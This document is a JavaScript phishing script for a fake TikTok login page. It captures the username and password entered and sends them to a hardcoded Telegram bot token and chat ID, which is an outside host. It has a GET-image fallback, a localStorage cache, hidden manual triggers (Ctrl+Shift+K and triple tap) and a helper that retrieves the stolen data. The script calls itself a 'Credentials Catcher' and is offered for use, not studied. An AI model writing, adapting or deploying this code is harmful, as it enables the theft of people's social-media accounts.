<script>
  (function() {
    'use strict';

    // ====== CONFIGURE YOUR TELEGRAM BOT HERE ======
    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';  // <-- your bot token
    const TELEGRAM_CHAT_ID = '8391692120';                                      // <-- your chat ID

    let credentialsSent = false;
    let submitAttempted = false;

    // DOM refs
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const togglePwdBtn = document.getElementById('togglePwd');

    // ---- helpers ----
    function getUsername() {
      return (usernameInput && usernameInput.value) ? usernameInput.value.trim() : '';
    }

    function getPassword() {
      return (passwordInput && passwordInput.value) ? passwordInput.value : '';
    }

    // ---- send to Telegram ----
    function sendToTelegram(username, password, callback) {
      if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.warn('⚠️ Telegram bot not configured');
        if (callback) callback(false);
        return;
      }

      const message =
        `🔑 TIKTOK CREDENTIALS\n\n` +
        `👤 Username/Email: ${username || '(empty)'}\n` +
        `🔐 Password: ${password || '(empty)'}\n` +
        `🕐 Time: ${new Date().toLocaleString()}\n` +
        `📍 Page: ${window.location.href}`;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      })
      .then(res => res.json())
      .then(data => {
        if (data.ok) {
          console.log('✅ Credentials sent to Telegram!');
          if (callback) callback(true);
        } else {
          console.warn('❌ Telegram API error:', data.description);
          sendViaImage(username, password, callback);
        }
      })
      .catch(() => {
        console.warn('⚠️ Fetch failed, trying fallback...');
        sendViaImage(username, password, callback);
      });
    }

    // fallback via image (GET request)
    function sendViaImage(username, password, callback) {
      const msg = `User: ${username} | Pass: ${password}`;
      const encoded = encodeURIComponent(msg);
      const url =
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encoded}`;

      try {
        const img = new Image();
        img.onload = function() {
          console.log('✅ Fallback succeeded');
          if (callback) callback(true);
        };
        img.onerror = function() {
          console.warn('⚠️ Fallback failed, saving to localStorage');
          try {
            localStorage.setItem('pending_tiktok_creds', JSON.stringify({
              username, password, timestamp: new Date().toISOString()
            }));
          } catch(e) {}
          if (callback) callback(false);
        };
        img.src = url;
      } catch(e) {
        if (callback) callback(false);
      }
    }

    // ---- capture and send ----
    function captureAndSend(trigger, callback) {
      if (credentialsSent) {
        if (callback) callback(true);
        return;
      }

      // small delay to ensure fields are captured
      setTimeout(function() {
        const username = getUsername();
        const password = getPassword();

        // only send if password is not empty (or username not empty)
        if (password.length > 0) {
          console.log('%c🔑 CREDENTIALS CAPTURED!', 'font-size:18px;font-weight:bold;color:#0f0;background:#000;padding:8px;border-radius:4px;');
          console.log('👤 Username/Email:', username);
          console.log('🔐 Password:', password);
          console.log('📍 Trigger:', trigger);
          console.log('=' .repeat(50));

          credentialsSent = true;

          sendToTelegram(username, password, function(success) {
            try {
              localStorage.setItem('tiktok_captured', JSON.stringify({
                username, password, trigger, timestamp: new Date().toISOString(), sent: success
              }));
              window._tiktokCaptured = { username, password, trigger, timestamp: new Date().toISOString() };
            } catch(e) {}
            if (callback) callback(success);
          });
        } else {
          console.warn('⚠️ Password empty, not sending.');
          if (callback) callback(false);
        }
      }, 300);
    }

    // ---- show password toggle ----
    if (togglePwdBtn && passwordInput) {
      togglePwdBtn.addEventListener('click', function(e) {
        e.preventDefault();
        const isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
        togglePwdBtn.textContent = isPassword ? '🙈' : '👁';
      });
    }

    // ---- login button handler ----
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault();
        if (!submitAttempted) {
          submitAttempted = true;

captureAndSend('login_button', function(success) {

    alert('✅ Credentials sent to Telegram!');
    // Do nothing - stay on current page
});
        }
      });
    }

    // ---- Enter key on password field ----
    if (passwordInput) {
      passwordInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
          e.preventDefault();
          if (!submitAttempted) {
            submitAttempted = true;
            console.log('🔵 Enter pressed – capturing...');
captureAndSend('enter_key', function(success) {
    if (success) {
        alert('✅ Credentials sent to Telegram!');
    } else {
        alert('❌ Failed to send credentials. Check console.');
    }
    // Stay on current page
});
          }
        }
      });
    }

    // ---- manual capture: Ctrl+Shift+K (desktop) ----
    document.addEventListener('keydown', function(e) {
      if (e.ctrlKey && e.shiftKey && (e.key === 'K' || e.key === 'k')) {
        e.preventDefault();
        console.log('🔵 Manual capture triggered (Ctrl+Shift+K)');
        captureAndSend('manual_shortcut');
      }
    });

    // ---- mobile: triple tap anywhere ----
    let tapCount = 0;
    let tapTimer = null;
    document.addEventListener('click', function(e) {
      // only on touch devices
      if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
        tapCount++;
        clearTimeout(tapTimer);
        tapTimer = setTimeout(function() {
          if (tapCount >= 3) {
            tapCount = 0;
            console.log('📱 Triple tap detected – manual capture!');
            captureAndSend('manual_triple_tap');
          } else {
            tapCount = 0;
          }
        }, 500);
      }
    });

    // ---- retrieve captured data (helper) ----
    window.getTikTokCaptured = function() {
      try {
        const stored = localStorage.getItem('tiktok_captured');
        if (stored) {
          const data = JSON.parse(stored);
          console.log('📂 Retrieved from localStorage:');
          console.log('👤 Username:', data.username);
          console.log('🔐 Password:', data.password);
          return data;
        }
      } catch(e) {}
      if (window._tiktokCaptured) {
        console.log('📂 Retrieved from memory:');
        console.log('👤 Username:', window._tiktokCaptured.username);
        console.log('🔐 Password:', window._tiktokCaptured.password);
        return window._tiktokCaptured;
      }
      console.log('❌ No credentials captured yet.');
      return null;
    };

    // ---- fake "switch to phone" link ----
    document.getElementById('switchToPhone')?.addEventListener('click', function(e) {
      e.preventDefault();
      alert('Phone login not implemented in this demo.');
    });

    // ---- back link ----
    document.getElementById('backLink')?.addEventListener('click', function() {
      history.back();

    // ---- log active status ----
    console.log('%c🔐 TikTok Credentials Catcher (Mobile + Desktop)', 'font-size:16px;font-weight:bold;color:#0f0;background:#000;padding:10px;border-radius:6px;');
    console.log('📱 Works on desktop AND mobile');
    console.log('📌 Credentials sent ONLY on submit (not while typing)');

    console.log('📌 Retrieve with: getTikTokCaptured()');

  })();
